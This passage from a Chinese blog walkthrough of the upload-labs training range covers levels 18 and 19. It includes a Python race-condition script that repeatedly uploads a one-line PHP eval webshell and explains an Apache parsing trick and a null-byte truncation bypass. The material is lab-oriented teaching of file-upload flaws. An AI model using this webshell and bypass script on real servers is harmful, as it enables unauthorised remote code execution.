class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</div><div class="line">            <span class="keyword">break</span>; </div><div class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</div><div class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</div><div class="line">            <span class="keyword">break</span>; </div><div class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</div><div class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</div><div class="line">            <span class="keyword">break</span>; </div><div class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</div><div class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</div><div class="line">            <span class="keyword">break</span>; </div><div class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</div><div class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</div><div class="line">            <span class="keyword">break</span>; </div><div class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</div><div class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</div><div class="line">            <span class="keyword">break</span>; </div><div class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</div><div class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</div><div class="line">            <span class="keyword">break</span>;      </div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            $msg = <span class="string">'未知错误！'</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//myupload.php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</div><div class="line">......</div><div class="line">......</div><div class="line">...... </div><div class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</div><div class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</div><div class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</div><div class="line"></div><div class="line">......</div><div class="line">......</div><div class="line">......  </div><div class="line">  <span class="comment">/** upload()</span></div><div class="line"><span class="comment">   **</span></div><div class="line"><span class="comment">   ** Method to upload the file.</span></div><div class="line"><span class="comment">   ** This is the only method to call outside the class.</span></div><div class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></div><div class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></div><div class="line"><span class="comment">  **/</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</div><div class="line">    </div><div class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</div><div class="line">    </div><div class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</div><div class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</div><div class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</div><div class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</div><div class="line">      </div><div class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</div><div class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></div><div class="line"></div><div class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</div><div class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// check if we need to rename the file</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</div><div class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</div><div class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</div><div class="line">  </div><div class="line">  &#125;</div><div class="line">......</div><div class="line">......</div><div class="line">...... </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><strong>分析一下代码的执行过程，首先使用<code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>接收文件名，然后获取文件后缀名进行白名单检查，需要注意的是这里使用的<code>strrchr</code>函数去截取后缀名的，所以获取到的是最后一个点后面的后缀名。如果后缀名不在白名单内的话就会提示上传失败，否则就会将文件使用<code>rename</code>函数重命名后上传至指定的目录，比如上传的是<code>shell.php.xxx</code>,<code>shell.php</code>会被重命名，导致最终文件命名变为<code>xxxx.jpg</code>而无法解析，所以这里同样需要使用竞争上传的方式，在重命名之前将文件上传至服务器，之后再结合apache2.2.x的解析漏洞使文件被解析，所以这里可以构造文件名为<code>shell.php.7z</code></strong></p>
<p><strong>贴出我写的上传脚本</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CompeteUpload</span><span class="params">(list)</span>:</span></div><div class="line">    url=<span class="string">"http://192.168.233.130:8080/upload-labs/Pass-18/index.php"</span></div><div class="line">    geturl=<span class="string">"http://192.168.233.130:8080/upload-labs/upload/info.php"</span></div><div class="line">    file=&#123;<span class="string">'upload_file'</span>:(<span class="string">'shell.php.7z'</span>,<span class="string">"&lt;?php @eval($_POST['c1imber']);?&gt;"</span>,<span class="string">'image/jpeg'</span>)&#125;</div><div class="line">    data=&#123;<span class="string">'submit'</span>:<span class="string">'上传'</span>&#125;</div><div class="line">    r=requests.post(url=url,data=data,files=file)</div><div class="line">    <span class="comment">#print "test upload...."</span></div><div class="line">    r1=requests.get(url=geturl)</div><div class="line">    <span class="keyword">if</span> r1.status_code==<span class="number">200</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"upload success!"</span></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool = Pool(<span class="number">10</span>)</div><div class="line">    pool.map(CompeteUpload, range(<span class="number">10000</span>))</div><div class="line">    pool.close()</div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<p><strong>成功上传</strong><br><img src="http://pic.c1imber.top/blog/20181221/1WuFLEL7tDJ3.png" alt="mark"></p>
<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p><strong>代码如下：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line"></div><div class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</div><div class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</div><div class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                $msg = <span class="string">'上传失败！'</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>这一关和第11关类似，只不过这一关的路径部分是由<code>$_POST</code>控制的，而第十一关是由<code>$_GET</code>控制的，不过原理都是一样的，这样会导致00字符可以被拼接入文件路径内，进而被传入<code>move_uploaded_file</code>函数内，然后该函数在将临时文件移动至指定路径的时候将会产生00截断上传(CVE-2015-2348)</strong></p>
<p><strong>所以这里可以设置文件名为<code>shell.php .jpg</code>，然后在空格处进行00截断</strong><br><img src="http://pic.c1imber.top/blog/20181221/9dnEHv7Mzkx6.png" alt="mark"></p>
<p><strong>之后就可以上传成功了</strong><br><img src="http://pic.c1imber.top/blog/20181221/kEAzuUEwJYKl.png" alt="mark"><br><img src="http://pic.c1imber.top/blog/20181221/RdtPMTDYcjFX.png" alt="mark"></p>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="http://lawlietweb.com">C1imber</a>
            <p>原文链接：<a href="http://lawlietweb.com/2018/06/07/upload-labs/">http://lawlietweb.com/2018/06/07/upload-labs/</a>
            <p>发表日期：<a href="http://lawlietweb.com/2018/06/07/upload-labs/">June 7th 2018, 4:59:26 pm</a>
            <p>更新日期：<a href="http://lawlietweb.com/2018/06/07/upload-labs/">December 21st 2018, 7:21:31 pm</a>
            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2018/06/30/dnslogsqli/" title= "渗透技巧:使用dnslog加快盲注速度">
                    <div class="nextTitle">渗透技巧:使用dnslog加快盲注速度</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2018/06/06/pyblindsqlimax/" title= "python布尔盲注脚本算法完善">
                    <div class="prevTitle">python布尔盲注脚本算法完善</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:1372003815@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
    
        
            
                <span class="iconfont-archer wechat" title=wechat>
                  
                  <img class="profile-qr" src="/assets/mywechat.jpg" />
                </span>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#upload-labs通关教程（持续更新）"><span class="toc-number">1.</span> <span class="toc-text">upload-labs通关教程（持续更新）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#序"><span class="toc-number">1.0.1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#靶场环境"><span class="toc-number">1.0.2.</span> <span class="toc-text">靶场环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第一关"><span class="toc-number">1.0.3.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二关"><span class="toc-number">1.0.4.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三关-amp-第四关"><span class="toc-number">1.0.5.</span> <span class="toc-text">第三关&第四关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第五关"><span class="toc-number">1.0.6.</span> <span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第六关"><span class="toc-number">1.0.7.</span> <span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第七关"><span class="toc-number">1.0.8.</span> <span class="toc-text">第七关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第八关"><span class="toc-number">1.0.9.</span> <span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第九关"><span class="toc-number">1.0.10.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第十关"><span class="toc-number">1.0.11.</span> <span class="toc-text">第十关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第十一关"><span class="toc-number">1.0.12.</span> <span class="toc-text">第十一关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第十二关"><span class="toc-number">1.0.13.</span> <span class="toc-text">第十二关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第十三关-amp-第十四关-amp-第十五关"><span class="toc-number">1.0.14.</span> <span class="toc-text">第十三关&第十四关&第十五关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第十六关"><span class="toc-number">1.0.15.</span> <span class="toc-text">第十六关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第十七关"><span class="toc-number">1.0.16.</span> <span class="toc-text">第十七关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第十八关"><span class="toc-number">1.0.17.</span> <span class="toc-text">第十八关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第十九关"><span class="toc-number">1.0.18.</span> <span class="toc-text">第十九关</span></a></li></ol></li></ol></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 54
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/18</span><a class="archive-post-title" href= "/2019/04/18/DDCTF2019 write up/" >DDCTF2019 write up</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/17</span><a class="archive-post-title" href= "/2019/02/17/ubuntu本地提权漏洞复现学习（CVE-2019-7304）/" >ubuntu本地提权漏洞复现学习（CVE-2019-7304）</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2019/01/11/mssql盲注与dnslog的完美结合(命令执行)/" >渗透技巧-mssql盲注与dnslog的完美结合(命令执行)</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/2018/12/21/phpcms2008 type.php代码执行漏洞/" >phpcms2008 type.php代码执行漏洞分析与复现</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/30</span><a class="archive-post-title" href= "/2018/11/30/Code-Breaking Puzzles挑战/" >Code-Breaking Puzzles挑战</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/2019强网杯-过滤select的注入/" >2019强网杯-过滤select的注入</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/2018湖湘杯/" >2018湖湘杯注入题writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/深入学习PHP反序列化漏洞-绕过_wakeup()函数/" >深入学习PHP反序列化漏洞-绕过_wakeup()函数</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2018/10/08/记一次ctf极限利用-不包含数字字母的webshell/" >记一次ctf极限利用-不包含数字字母的webshell</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/Ecshop2.x & 3.x版本最新漏洞分析与利用/" >Ecshop2.x注入漏洞&代码执行漏洞分析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/02</span><a class="archive-post-title" href= "/2018/09/02/2018-09-02/" >记一次有意思的XSS绕过之奇葩的中文尖括号</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/ssrf/" >ssrf漏洞原理以及利用方法</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/2018-08-26/" >Centos6 更新curl版本</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2018/08/19/2018-08-19/" >记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/2018-08-18/" >关于ubuntu和centos cron的一些区别</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/2018-08-17/" >解决ubuntu任务计划写shell失败的问题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2018/08/08/漏洞组合/" >漏洞挖掘中的脑洞大开---使用漏洞组合拳扩大漏洞危害</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2018/07/17/linuxshell/" >Linux下几种反弹shell方法的总结与理解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/30</span><a class="archive-post-title" href= "/2018/06/30/dnslogsqli/" >渗透技巧:使用dnslog加快盲注速度</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/07</span><a class="archive-post-title" href= "/2018/06/07/upload-labs/" >upload-labs通关教程</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2018/06/06/pyblindsqlimax/" >python布尔盲注脚本算法完善</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/05</span><a class="archive-post-title" href= "/2018/06/05/pyblindsqli/" >python编程实现自动化注入之布尔盲注</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/05</span><a class="archive-post-title" href= "/2018/06/05/pyoptparse/" >python optparse模块使用总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/04</span><a class="archive-post-title" href= "/2018/06/04/pybinarysearch/" >python有序二分查找算法</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/BurpSQLiPY/" >burpsuite中配置使用sqlmapapi</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/02</span><a class="archive-post-title" href= "/2018/06/02/sqlmapgsearch/" >解决sqlmap不能使用-g的问题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2018/05/25/iscc2018/" >ISCC2018 write up</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2018/05/19/apache_security_config/" >Apache安全加固</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2018/05/17/autocheck/" >用shell实现对指定ip进行自动基线安全检查</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/14</span><a class="archive-post-title" href= "/2018/05/14/autobrute/" >用shell实现自动化扫描主机端口爆破服务弱口令</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2018/05/13/parse_url/" >php parse_url()函数的漏洞</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2018/04/19/wificrack/" >kali无线网卡wifi破解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2018/04/17/butianspider/" >python爬取补天src列表</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2018/03/21/dns_spoof/" >Ettercap实现局域网dns劫持</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2018/03/12/N1CTF2018/" >N1CTF2018 77777 writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/centos7mysql/" >centos7安装mysql</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/12</span><a class="archive-post-title" href= "/2018/01/12/arpattack/" >arp协议分析&python编程实现arp欺骗抓图片</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/12</span><a class="archive-post-title" href= "/2018/01/12/KPPW25xss/" >KPPW2.5XSS引起的CSRF</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2018/01/11/KPPW25fileupload/" >KPPW2.5文件上传导致远程代码执行</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2018/01/11/KPPW25sqli/" >KPPW2.5几处sql注入漏洞利用与exp编写</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2017 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2017/12/26/DVWACommandInjection/" >dvwa Command Injection</a>
        </li>
    
    
        <li class="archive-post-item">
